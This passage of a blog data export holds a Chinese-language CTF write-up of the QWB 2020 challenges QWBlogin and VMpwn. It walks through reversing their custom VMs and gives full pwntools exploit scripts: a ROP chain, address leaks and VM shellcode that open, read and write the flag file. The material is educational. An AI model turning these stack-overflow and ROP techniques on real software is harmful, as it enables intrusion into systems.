class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x21</span>\n<span class=\"hljs-keyword\">syscall</span> data\t\t\t\t\t| read(<span class=\"hljs-number\">0</span>, data[<span class=\"hljs-number\">0x40</span>], <span class=\"hljs-number\">0x21</span>)\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r8</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x40</span>]\t| G00DR3VR\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r9</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x427234129827abcd</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x10240740dc179b8a</span>\n<span class=\"hljs-keyword\">je</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r8</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x48</span>]\t| W31LD0N3\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r9</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x127412341241dead</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x213a22705e70edfa</span>\n<span class=\"hljs-keyword\">je</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r8</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x50</span>]\t| Try2Pwn!\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r9</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x8634965812abc123</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0xa75ae10820d2b377</span>\n<span class=\"hljs-keyword\">je</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r8</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">ptr</span> data[<span class=\"hljs-number\">0x58</span>]\t| GOGOGOGO\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r9</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x123216781236789a</span>\n<span class=\"hljs-keyword\">xor</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">r9</span>\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r8</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x5d75593f5d7137dd</span>\n<span class=\"hljs-keyword\">je</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x34</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x6</span>\n<span class=\"hljs-keyword\">syscall</span> data\n<span class=\"hljs-keyword\">push</span> <span class=\"hljs-built_in\">qword</span> r17\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> r17, r16\n<span class=\"hljs-keyword\">sub</span> r16, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x100</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r4</span>, r16\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r5</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0xa214f474f4721</span>\n<span class=\"hljs-keyword\">push</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r5</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r5</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x574f4e54494e5750</span>\n<span class=\"hljs-keyword\">push</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r5</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r5</span>, r16\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r2</span>, r16\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0xf</span>\n<span class=\"hljs-keyword\">syscall</span> stack\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">r4</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x800</span>\n<span class=\"hljs-keyword\">syscall</span> stack\t\t\t\t\t| read(<span class=\"hljs-number\">0</span>, stack[], <span class=\"hljs-number\">0x800</span>)\n<span class=\"hljs-keyword\">cmp</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0</span>         \n<span class=\"hljs-keyword\">jnl</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">hlt</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r3</span>, <span class=\"hljs-built_in\">r0</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r1</span>, <span class=\"hljs-built_in\">byte</span> <span class=\"hljs-number\">0x1</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-built_in\">r2</span>, <span class=\"hljs-built_in\">r4</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">r0</span>, <span class=\"hljs-built_in\">qword</span> <span class=\"hljs-number\">0x2</span>\n<span class=\"hljs-keyword\">mov</span> <span class=\"hljs-built_in\">qword</span> r16, r17      \n<span class=\"hljs-keyword\">pop</span> <span class=\"hljs-built_in\">qword</span> r17\n<span class=\"hljs-keyword\">ret</span></code></pre>\n\n<p>于是程序就比较清晰了，如果输入了<code>password</code>为<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>就能走到最后溢出的地方</p>\n<p>最后在<code>read(0, stack, 0x800)</code>的地方会出现溢出，然后在<code>ret</code>的时候把栈上的内容<code>pop</code>到<code>vm.pc</code>，于是就需要在<code>test.bin</code>里面找到可以用<code>gadgets</code></p>\n<h3 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h3><h4 id=\"gadgets\"><a href=\"#gadgets\" class=\"headerlink\" title=\"gadgets\"></a>gadgets</h4><p>在程序<code>RET</code>之后还有一大段无关的<code>opcode</code>，做到这步的时候才知道，这些就是为了凑<code>gadgets</code>的</p>\n<p>其中标记为<code>R</code>的是不需要限制的</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># 0x0d 0xR6 0x00 0x11 0xRR</span>\npop_r00_ret = <span class=\"hljs-number\">0x2f5</span>         <span class=\"hljs-comment\"># 0x46</span>\n<span class=\"hljs-comment\"># 0x0d 0xR6 0x01 0X11 0xRR</span>\npop_r01_ret = <span class=\"hljs-number\">0x377</span>         <span class=\"hljs-comment\"># 0x46</span>\n<span class=\"hljs-comment\"># 0x0d 0xR6 0x02 0x11 0xRR</span>\npop_r02_ret = <span class=\"hljs-number\">0x45c</span>         <span class=\"hljs-comment\"># 0x46</span>\n<span class=\"hljs-comment\"># 0x0d 0xR6 0x03 0x11 0xRR</span>\npop_r03_ret = <span class=\"hljs-number\">0x4e1</span>         <span class=\"hljs-comment\"># 0x46</span>\n\n<span class=\"hljs-comment\"># 0x20 0x0a 0x11 0xRR</span>\nsys_open_ret = <span class=\"hljs-number\">0x6ed</span>\n<span class=\"hljs-comment\"># 0x20 0xR8 0x11 0xRR</span>\nsys_data_ret = <span class=\"hljs-number\">0x5b1</span>\n<span class=\"hljs-comment\"># 0x20 0xR9 0x11 0xRR</span>\nsys_stack_ret = <span class=\"hljs-number\">0x617</span></code></pre>\n\n\n\n<h4 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h4><p>由于<code>syscall</code>中只有<code>open | read | write | close</code>可用，很自然想到<code>orw</code>，然后构造<code>rop</code>链就行了，其中由于最开始打开了<code>test.bin</code>文件，所以<code>fd=4</code>，最初写<code>exp</code>的时候被坑了一下，以及调试的时候希望能有结构体的符号，我编译了<code>struct.c =&gt; struct.o</code>再在调试的时候<code>add-symbol-file struct.o 0</code>即可</p>\n<pre><code class=\"hljs python\">payload = <span class=\"hljs-string\">b&quot;A&quot;</span>*<span class=\"hljs-number\">0x108</span>\n<span class=\"hljs-comment\"># read(0, data[0x100], 0x20)</span>\n<span class=\"hljs-comment\"># r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20</span>\npayload += p64(pop_r00_ret) + p64(<span class=\"hljs-number\">1</span>) + p64(pop_r01_ret) + p64(<span class=\"hljs-number\">0</span>) + p64(pop_r02_ret) + p64(<span class=\"hljs-number\">0x100</span>) + p64(pop_r03_ret) + p64(<span class=\"hljs-number\">0x20</span>)\npayload += p64(sys_data_ret)\n\n<span class=\"hljs-comment\"># open(data[0x100], 0)</span>\n<span class=\"hljs-comment\"># r00 = 0 r01 = 0x200 r02 = 0</span>\npayload += p64(pop_r00_ret) + p64(<span class=\"hljs-number\">0</span>) + p64(pop_r01_ret) + p64(<span class=\"hljs-number\">0x100</span>) + p64(pop_r02_ret) + p64(<span class=\"hljs-number\">0</span>)\npayload += p64(sys_open_ret)\n\n<span class=\"hljs-comment\"># read(4, data[0x100], 0x30)</span>\n<span class=\"hljs-comment\"># r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30</span>\npayload += p64(pop_r00_ret) + p64(<span class=\"hljs-number\">1</span>) + p64(pop_r01_ret) + p64(<span class=\"hljs-number\">0x4</span>) + p64(pop_r02_ret) + p64(<span class=\"hljs-number\">0x100</span>) + p64(pop_r03_ret) + p64(<span class=\"hljs-number\">0x30</span>)\npayload += p64(sys_data_ret)\n\n<span class=\"hljs-comment\"># write(1, data[0x100], 0x30)</span>\n<span class=\"hljs-comment\"># r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30</span>\npayload += p64(pop_r00_ret) + p64(<span class=\"hljs-number\">2</span>) + p64(pop_r01_ret) + p64(<span class=\"hljs-number\">0x1</span>) + p64(pop_r02_ret) + p64(<span class=\"hljs-number\">0x100</span>) + p64(pop_r03_ret) + p64(<span class=\"hljs-number\">0x30</span>)\npayload += p64(sys_data_ret)</code></pre>\n\n\n\n<p>强的大佬，不需要<code>instruction.h</code>都能在5个小时内做出来，而我就是只菜鸡</p>\n<p><a href=\"https://github.com/Vang3lis/CTF_repo/tree/master/QWB_2020/QWBlogin\">QWBlogin 题目</a></p>\n<h2 id=\"VMpwn\"><a href=\"#VMpwn\" class=\"headerlink\" title=\"VMpwn\"></a>VMpwn</h2><p>这个题目跟上一个题目一样先逆向，但是这个题目跟<code>QWBlogin</code>相比实现<code>vm</code>的时候简单一些</p>\n<p>其中有一个 <code>chunk 0x30</code>用来记录寄存器的值<code>vm[0] vm[1] vm[2]</code> 类似<code>rdi, rsi, rdx</code>在<code>syscall</code>时会用到，<code>vm[3]</code>为<code>sp</code>，<code>vm[5]</code>为 <code>pc</code></p>\n<p>在最后的关键操作为对于<code>read(0, stack, 0x1000)</code>（栈只有<code>0x100</code>个字节）</p>\n<pre><code class=\"hljs assembly\">pwndbg&gt; distance 0x555555759050 0x55555575ad68\n0x555555759050-&gt;0x55555575ad68 is 0x1d18 bytes (0x3a3 words)\n\n RAX  0x7ffff7b156c0 (read) ◂— cmp    dword ptr [rip + 0x2c3039], 0\n ► 0x5555555555db    call   rax &lt;0x7ffff7b156c0&gt;\n        fd: 0x0\n        buf: 0x55555575ad68 ◂— 0x0\n        nbytes: 0x1000\n\npwndbg&gt; telescope 0x555555758010\n00:0000│   0x555555758010 ◂— 0x0\n01:0008│   0x555555758018 —▸ 0x55555575ad68 ◂— 0x0\n02:0010│   0x555555758020 ◂— 0x1000\n03:0018│   0x555555758028 —▸ 0x55555575ad68 ◂— 0x0\n04:0020│   0x555555758030 ◂— 0x0\n05:0028│   0x555555758038 —▸ 0x5555557572d6 ◂— 0x772c6b6f11028f10</code></pre>\n\n<p>然后<code>puts(stack)</code>，可以看到该虚拟栈上有<code>heap</code>地址和<code>elf</code>地址，但是只能泄漏一个</p>\n<pre><code class=\"hljs assembly\">pwndbg&gt; telescope 0x55555575ad68 0x30\n00:0000│ rsi  0x55555575ad68 ◂— &#39;1234454636\\n&#39;\n01:0008│      0x55555575ad70 ◂— 0xa3633 &#x2F;* &#39;36\\n&#39; *&#x2F;\n02:0010│      0x55555575ad78 ◂— 0x0\n... ↓\n1e:00f0│      0x55555575ae58 —▸ 0x555555758050 ◂— 0x20746168772c6b6f (&#39;ok,what &#39;)\n1f:00f8│      0x55555575ae60 ◂— 0x0\n20:0100│      0x55555575ae68 —▸ 0x555555757851 ◂— 0xff</code></pre>\n\n<p>接下来同第一步的<code>read(0, stack, 0x1000)</code> <code>write(0, stack, 0x20)</code>然后<code>ret</code></p>\n<p>这个程序中有一个两个比较奇怪的地方，由于<code>ret</code>的时候程序的实现，是将<code>sp-=8</code>，但是<code>PUSH</code>为<code>sp-=8</code> <code>POP</code>为<code>sp+=8</code>，因此<code>ret</code>的时候比较奇怪，另外就是与<code>QWBlogin</code>相比没有 什么能用的<code>gadget</code>，因此想法只能为按照<code>vm</code>的规则，写<code>shellocde</code>，然后在最后<code>ret</code>的时候跳转过去，但是该题用 <code>seccomp</code>限制了只能 <code>orw</code>，且没有给<code>open</code>的 <code>syscall</code>只能泄漏</p>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><p>因此思路就是，先利用<code>puts</code>泄漏<code>elf</code>的地址，然后再<code>ret</code>到最初<code>elf_code+0x3</code>然后再泄漏<code>heap</code>，<code>ret</code>到写入栈上的<code>shellcode</code></p>\n<p>利用<code>puts</code>泄漏<code>libc</code>，然后再次输入到栈上，利用<code>\\x6d: mov reg[0], 0</code>作为<code>nop</code>，编写<code>shellcode</code></p>\n<p>然后将<code>open</code>写入<code>free</code>的位置，因此在调用<code>syscall 03</code>时就是调用<code>open</code>，最后利用<code>orw</code>进行读取<code>flag</code></p>\n<h3 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h3><pre><code class=\"hljs python\"><span class=\"hljs-comment\"># heap+0x2e68 =&gt; elf_bss</span>\n\nio.sendafter(<span class=\"hljs-string\">&quot;name:&quot;</span>, <span class=\"hljs-string\">&quot;A&quot;</span>*<span class=\"hljs-number\">0xff</span>+<span class=\"hljs-string\">&quot;#&quot;</span>)\n\nio.recvuntil(<span class=\"hljs-string\">&quot;#&quot;</span>)\nelf.address = u64(io.recvn(<span class=\"hljs-number\">6</span>) + <span class=\"hljs-string\">&quot;\\x00\\x00&quot;</span>) - <span class=\"hljs-number\">0x203851</span>\nsuccess(<span class=\"hljs-string\">&quot;elf&quot;</span>, elf.address)\n\n\n<span class=\"hljs-comment\"># 0xf8 + ret </span>\nio.sendafter(<span class=\"hljs-string\">&quot;say:&quot;</span>, <span class=\"hljs-string\">&quot;A&quot;</span>*<span class=\"hljs-number\">0x100</span> + p64(elf.address + <span class=\"hljs-number\">0x203023</span>))\n\nio.sendafter(<span class=\"hljs-string\">&quot;name:&quot;</span>, <span class=\"hljs-string\">&quot;\\x50&quot;</span>)\nheap = u64(io.recvn(<span class=\"hljs-number\">6</span>) + <span class=\"hljs-string\">&quot;\\x00\\x00&quot;</span>) - <span class=\"hljs-number\">0x50</span>\nsuccess(<span class=\"hljs-string\">&quot;heap&quot;</span>, heap)\n\n<span class=\"hljs-string\">&#x27;&#x27;&#x27;</span>\n<span class=\"hljs-string\">mov reg[0], read_got</span>\n<span class=\"hljs-string\">puts</span>\n<span class=\"hljs-string\">mov reg[0], 0</span>\n<span class=\"hljs-string\">mov reg[1], heap + addr</span>\n<span class=\"hljs-string\">mov reg[2], 0x1000</span>\n<span class=\"hljs-string\">read        </span>\n<span class=\"hljs-string\">//  use 0x6d: mov reg[0], 0 as nop</span>\n<span class=\"hljs-string\">&#x27;&#x27;&#x27;</span>\n\npayload = <span class=\"hljs-string\">&quot;\\x11&quot;</span> + p64(elf.got[<span class=\"hljs-string\">&#x27;read&#x27;</span>])\npayload += <span class=\"hljs-string\">&quot;\\x8f\\x02&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x6d&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x12&quot;</span> + p64(heap+<span class=\"hljs-number\">0x2d60</span>)\npayload += <span class=\"hljs-string\">&quot;\\x13&quot;</span> + p64(<span class=\"hljs-number\">0x1000</span>)\npayload += <span class=\"hljs-string\">&quot;\\x8f\\x00&quot;</span>\npayload = payload.ljust(<span class=\"hljs-number\">0x100</span>, <span class=\"hljs-string\">&quot;A&quot;</span>)\npayload += p64(heap+<span class=\"hljs-number\">0x2d60</span>)\nio.sendafter(<span class=\"hljs-string\">&quot;say:&quot;</span>, payload)\n\nio.recvuntil(<span class=\"hljs-string\">&quot;bye~\\n&quot;</span>)\n\nlibc.address = u64(io.recvuntil(<span class=\"hljs-string\">&quot;\\n&quot;</span>, drop=<span class=\"hljs-literal\">True</span>).ljust(<span class=\"hljs-number\">8</span>, <span class=\"hljs-string\">&quot;\\x00&quot;</span>)) - libc.sym[<span class=\"hljs-string\">&#x27;read&#x27;</span>]\n\n<span class=\"hljs-string\">&#x27;&#x27;&#x27;</span>\n<span class=\"hljs-string\">flag</span>\n<span class=\"hljs-string\">0x6d * 0x50</span>\n<span class=\"hljs-string\">mov reg[1], elf.address+0x203900</span>\n<span class=\"hljs-string\">mov reg[2], 8</span>\n<span class=\"hljs-string\">read</span>\n<span class=\"hljs-string\">mov reg[0], heap+0x2d60</span>\n<span class=\"hljs-string\">mov reg[1], 0</span>\n<span class=\"hljs-string\">open</span>\n<span class=\"hljs-string\">mov reg[0], 3</span>\n<span class=\"hljs-string\">mov reg[1], bss</span>\n<span class=\"hljs-string\">mov reg[2], 0x30</span>\n<span class=\"hljs-string\">read</span>\n<span class=\"hljs-string\">mov reg[0], 1</span>\n<span class=\"hljs-string\">mov reg[1], bss</span>\n<span class=\"hljs-string\">mov reg[2], 0x30</span>\n<span class=\"hljs-string\">write</span>\n<span class=\"hljs-string\">&#x27;&#x27;&#x27;</span>\n\npayload = <span class=\"hljs-string\">&quot;flag\\x00&quot;</span>\npayload = payload.ljust(<span class=\"hljs-number\">0x50</span>, <span class=\"hljs-string\">&quot;\\x6d&quot;</span>)\npayload += <span class=\"hljs-string\">&quot;\\x12&quot;</span> + p64(elf.address+<span class=\"hljs-number\">0x2038f8</span>)\npayload += <span class=\"hljs-string\">&quot;\\x13&quot;</span> + p64(<span class=\"hljs-number\">8</span>)\npayload += <span class=\"hljs-string\">&quot;\\x8f\\x00&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x11&quot;</span> + p64(heap+<span class=\"hljs-number\">0x2d60</span>)\npayload += <span class=\"hljs-string\">&quot;\\x6e&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x8f\\x03&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x11&quot;</span> + p64(<span class=\"hljs-number\">3</span>)\npayload += <span class=\"hljs-string\">&quot;\\x12&quot;</span> + p64(elf.bss()+<span class=\"hljs-number\">0x400</span>)\npayload += <span class=\"hljs-string\">&quot;\\x13&quot;</span> + p64(<span class=\"hljs-number\">0x30</span>)\npayload += <span class=\"hljs-string\">&quot;\\x8f\\x00&quot;</span>\npayload += <span class=\"hljs-string\">&quot;\\x11&quot;</span> + p64(<span class=\"hljs-number\">1</span>)\npayload += <span class=\"hljs-string\">&quot;\\x12&quot;</span> + p64(elf.bss()+<span class=\"hljs-number\">0x400</span>)\npayload += <span class=\"hljs-string\">&quot;\\x13&quot;</span> + p64(<span class=\"hljs-number\">0x30</span>)\npayload += <span class=\"hljs-string\">&quot;\\x8f\\x01&quot;</span>\n\nio.send(payload)\n\nsleep(<span class=\"hljs-number\">0.03</span>)\n\nio.send(p64(libc.sym[<span class=\"hljs-string\">&#x27;open&#x27;</span>]))\n\nio.interactive()\nio.close()\n</code></pre>\n\n"}],"PostAsset":[],"PostCategory":[{"post_id":"ckekurjvc0001bxxndvtpcc7z","category_id":"ckekurjvi0002bxxn2bho4ijv","_id":"ckekurjvm0005bxxn2lb3fnox"}],"PostTag":[{"post_id":"ckekurjvc0001bxxndvtpcc7z","tag_id":"ckekurjvk0003bxxnb4gq72bx","_id":"ckekurjvn0007bxxn49zc08my"},{"post_id":"ckekurjvc0001bxxndvtpcc7z","tag_id":"ckekurjvl0004bxxnd990090q","_id":"ckekurjvn0008bxxn3ffjfh7t"},{"post_id":"ckekurjvc0001bxxndvtpcc7z","tag_id":"ckekurjvm0006bxxn4lzdg0w6","_id":"ckekurjvn0009bxxn1cmedpvx"}],"Tag":[{"name":"re","_id":"ckekurjvk0003bxxnb4gq72bx"},{"name":"vm","_id":"ckekurjvl0004bxxnd990090q"},{"name":"pwn","_id":"ckekurjvm0006bxxn4lzdg0w6"}]}}